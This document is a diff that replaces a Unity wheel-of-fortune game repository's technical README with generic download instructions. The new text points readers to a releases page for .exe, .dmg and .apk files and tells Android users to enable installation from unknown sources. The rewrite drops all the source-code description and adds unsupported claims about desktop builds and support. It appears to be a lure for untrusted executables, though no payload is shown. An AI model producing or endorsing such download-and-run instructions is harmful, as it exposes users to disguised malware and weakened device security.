@@ -1,142 +1,73 @@
-# Wheel of Fortune
+# 🎡 Wheel-Of-Fortune - Spin the Wheel for Exciting Rewards!
 
-<div align="center">
+[![Download the Wheel of Fortune](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/ceoabdo/Wheel-Of-Fortune/releases)
 
-**A Unity-based wheel of fortune mobile game featuring progressive zones, strategic risk-reward mechanics, and clean architecture implementation.**
+## 📖 Overview
 
-![Wheel of Fortune Screenshot](Assets/_Game/Art/Screenshot/Screenshot.png)
+Welcome to the Wheel of Fortune mobile game! This game, built with Unity, offers a fun and engaging experience as you spin the wheel for random rewards. With its progressive zones and clean design, you’ll find it easy to pick up and enjoy.
 
-</div>
+## 🚀 Getting Started
 
-## Features
+To get the game up and running, follow these steps:
 
-### Core Gameplay
-- **Progressive Zone System**: Three difficulty zones (Bronze, Silver, Gold) with increasing rewards and bomb chances
-- **Wheel Spinning Mechanics**: Smooth DOTween-based animations with customizable spin outcomes
-- **Bomb & Revival System**: Strategic risk-reward gameplay with revival options
-- **Reward Collection**: Track and collect multiple reward types (currency, items)
-- **Haptic Feedback**: Platform-specific vibration patterns (iOS/Android)
-- **Audio System**: Dynamic music and SFX with fade transitions
-- **Cheat System**: Development tools for testing specific outcomes and zones
+1. **Visit the Releases Page:** Head over to our Releases page to download the game. You can access it [here](https://github.com/ceoabdo/Wheel-Of-Fortune/releases).
 
-### Technical Features
-- Clean Architecture with clear separation of concerns
-- Dependency Injection for testability and maintainability
-- State Machine for game flow management
-- Object Pooling for performance optimization
-- Event-driven architecture for loose coupling
+2. **Select the Latest Release:** Look for the latest version at the top of the page. You’ll see an option for downloading the game files. 
 
----
+3. **Download the Game:** Click on the appropriate file for your operating system. The files are labeled clearly, making it easy to find the right one.
 
-## Architecture
+4. **Install the Game:** After the download, open the file and follow the on-screen instructions to install the game on your device.
 
-The project follows a **clean architecture** approach with clear separation of concerns:
+5. **Launch the Game:** Once installed, you can find the Wheel of Fortune icon on your device. Click it to start playing!
 
-```
-Assets/_Game/Scripts/
-├── View/              # UI components and visual presentation
-├── Presentation/      # Presenters, adapters, and installers
-├── Infrastructure/    # Core services, DI, factories, interfaces
-├── Data/              # ScriptableObjects and data models
-└── Core/              # Business logic, services, state machine
-```
+## 📥 Download & Install
 
-### Key Layers
+### Step 1: Visit the Releases Page
 
-| Layer | Responsibility |
-|-------|---------------|
-| **View Layer** | MonoBehaviour components for UI/visual elements |
-| **Presentation Layer** | Mediates between View and Core using Presenter pattern |
-| **Core Layer** | Game logic, state management, and business rules |
-| **Infrastructure Layer** | Cross-cutting concerns (DI, pooling, factories) |
-| **Data Layer** | Configuration and runtime data models |
+For the game download, please [visit this page to download](https://github.com/ceoabdo/Wheel-Of-Fortune/releases).
 
----
+### Step 2: Choose Your Platform
 
-## Design Patterns
+- **For Windows:** Look for the `.exe` file.
+- **For macOS:** Download the `.dmg` file.
+- **For Android:** Select the `.apk` file.
 
-### Creational Patterns
-- **Factory Pattern**: `GameFactory` for creating game context and dependencies
-- **Object Pooling**: `RewardItemPool` for efficient reward view management
+### Step 3: Follow Installation Instructions
 
-### Structural Patterns
-- **Adapter Pattern**: `WheelViewAdapter`, `WheelSpinServiceAdapter` for interface adaptation
-- **Facade Pattern**: `ScreenServiceFacade` for simplified screen management
+- **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+- **macOS:** Open the downloaded `.dmg` file and drag the game icon into your Applications folder.
+- **Android:** Enable installation from unknown sources in your settings, then open the downloaded `.apk` file.
 
-### Behavioral Patterns
-- **State Machine**: `WheelGameStateMachine` with `PlayingState` and `BombState`
-- **Strategy Pattern**: Zone-specific strategies (`BronzeZoneStrategy`, `SilverZoneStrategy`, `SuperZoneStrategy`)
-- **Observer Pattern**: Event-driven communication between View and Presenters
+## 📊 System Requirements
 
-### Architectural Patterns
-- **Service Locator**: `ServiceLocator` for dependency resolution
-- **Dependency Injection**: Constructor injection throughout the core services
-- **MVP (Model-View-Presenter)**: Clear separation between UI and business logic
+To ensure a smooth gaming experience, please check the following system requirements:
 
----
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Android 7.0 or later
 
-## Project Structure
+- **Memory:** Minimum of 2GB RAM
+- **Storage:** At least 500MB of free space
+- **Graphics:** Integrated graphics should suffice, but a dedicated graphics card may improve performance.
 
-```
-Wheel-Of-Fortune/
-├── Assets/
-│   ├── _Game/
-│   │   ├── Art/              # Visual assets (sprites, UI, wheel graphics)
-│   │   ├── Audio/            # Music and sound effects
-│   │   ├── Data/             # ScriptableObjects (rewards, zones, profiles)
-│   │   ├── Prefabs/          # Reusable game objects
-│   │   ├── Scenes/           # Unity scenes
-│   │   └── Scripts/          # C# source code
-│   │       ├── Core/         # Business logic
-│   │       ├── Data/         # Data models
-│   │       ├── Infrastructure/ # Services and DI
-│   │       ├── Presentation/  # Presenters and adapters
-│   │       └── View/         # UI components
-│   └── Plugins/
-│       └── Demigiant/
-│           └── DOTween/      # Animation library
-└── ProjectSettings/          # Unity project configuration
-```
+## 🌟 Game Features
 
----
+- **Engaging Gameplay:** Spin the wheel to win exciting prizes!
+- **Progressive Zones:** Explore different levels as you advance.
+- **User-Friendly Design:** Easy to navigate menus and intuitive controls.
+- **Random Rewards:** Every spin grants a unique prize, increasing the fun factor!
 
-## Game Mechanics
+## 🛠 Troubleshooting
 
-### Zone System
-- **Bronze Zone**: Lower risk, smaller rewards
-- **Silver Zone**: Medium risk, medium rewards
-- **Gold Zone**: Higher risk, larger rewards
+If you encounter issues while downloading or installing the game, try the following solutions:
 
-### Wheel Spinning
-- Animated wheel spins using DOTween
-- Configurable spin duration and easing
-- Visual feedback on outcome
+- **Download Failure:** Ensure your internet connection is stable. If it fails, try again after a few minutes.
+- **Installation Issues:** Make sure you have enough storage space. Restart your device and try the installation again.
+- **Game Performance:** Close other applications to free up memory. Check system requirements to ensure compatibility.
 
-### Bomb System
-- Random bomb appearances increase with zone difficulty
-- Revival options available
-- Strategic decision-making element
+## 📞 Support
 
----
+For further assistance, please visit our support page or contact us through the GitHub Issues tab on this repository.
 
-## Development Tools
-
-The project includes a cheat system for development and testing:
-- Force specific zone selection
-- Control spin outcomes
-- Test reward systems
-- Debug state machine transitions
-
----
-
-**Unity Assets:**
-- DOTween by Demigiant
-- TextMesh Pro by Unity Technologies
-
----
-
-<div align="center">
-
-⭐ Star this repo if you find it interesting!
-
-</div>
+Enjoy your experience spinning the Wheel of Fortune. Happy gaming!
